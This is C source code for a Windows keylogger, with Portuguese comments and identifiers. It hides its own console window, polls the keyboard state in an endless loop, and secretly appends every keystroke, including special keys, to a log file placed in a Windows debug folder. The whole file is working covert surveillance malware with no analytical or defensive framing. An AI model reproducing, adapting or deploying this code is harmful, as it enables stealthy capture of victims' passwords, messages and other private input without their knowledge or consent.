#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <Winuser.h>

#define LOG "C:\\Windows\\debug\\WIA\\LOG.txt"
#define wf fprintf
#define MAX_BUF 1024

#define TRUE 1
#define FALSE 0

void * getkey( void );
void * checarkey( int );
void * data( char * );
void * die( char *, int );

int main( int argc, char *argv[] ) {
	getkey();	
	return 0;
}

void * die(char *str, int erro) {
	wf(stderr, "%s", str);
	exit(erro);
	return ( void *)0;
}

void * data( char *string ) {
        FILE *ptrarquivo = NULL;
        ptrarquivo = fopen(LOG, "a+");

        if ( ptrarquivo == NULL ) {
                die("erro ao abrir arquivo. \n", -1);
                }

                fputs(string, ptrarquivo);
                fclose(ptrarquivo);

}

void * checarkey(int key) {
         switch(key) {
             case VK_SPACE:
                data(" [SPACE] ");
                break;
            case VK_SHIFT:
                data(" [SHIFT] ");
                break;
            case VK_LBUTTON:
                data(" [LBUTTON] ");
                break;
            case VK_MBUTTON:
                data(" [MBUTTON] ");
                break;
            case VK_CONTROL:
                data(" [CONTROL] ");
                break;
            case VK_RETURN:
                data( "\n[ENTER] " );
                break;
            case VK_ESCAPE:
                data(" [ESC] ");
                break;
            case VK_LSHIFT:
                data( "[LSHIFT]" );
                break;
            case VK_RSHIFT:
                data( " [RSHIFT] " );
                break;
            case VK_OEM_PERIOD:
                data(" [PONTO] ");
                break;
            case VK_BACK:
                data(" [BACKSPACE] ");
                break;
            case VK_TAB:
                data(" [TAB] " );
                break;
            case VK_OEM_1:
                data("[;:]");
                break;
            case VK_OEM_2:
                data("[/?]");
                break;
            case VK_OEM_3:
                data("[`~]");
                break;
            case VK_OEM_4:
                data("[ [{ ]");
                break;
            case VK_OEM_5:
                data("[\\|]");
                break;
            case VK_OEM_6:
                data("[ ]} ]");
                break;
            case VK_OEM_7:
                data("['\"]");
                break;
                default:
                        return FALSE;
         }


}

void * getkey( void ) {
    unsigned char key;
    
    HWND ft; // não deixar a janela visível 
    AllocConsole();
	ft = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(ft, 0);
		 while (1) {
		 	
		 	 Sleep(10);
		 	 for (key = 8; key<=255; key++) {
		 	 	 if (GetAsyncKeyState(key) == -32767) {
		 	 	 	
		 	 	 	  if(checarkey(key) == FALSE) {
    	                  FILE *ptrarquivo = fopen(LOG, "a+");
		 	 	 	  	  wf(ptrarquivo, "%c", key);
		                  fclose(ptrarquivo);
		                  
					  }
				   }
				   if (key == 255) {
				   	   key = 8;
				   }
			  }
		 }
    	
} 


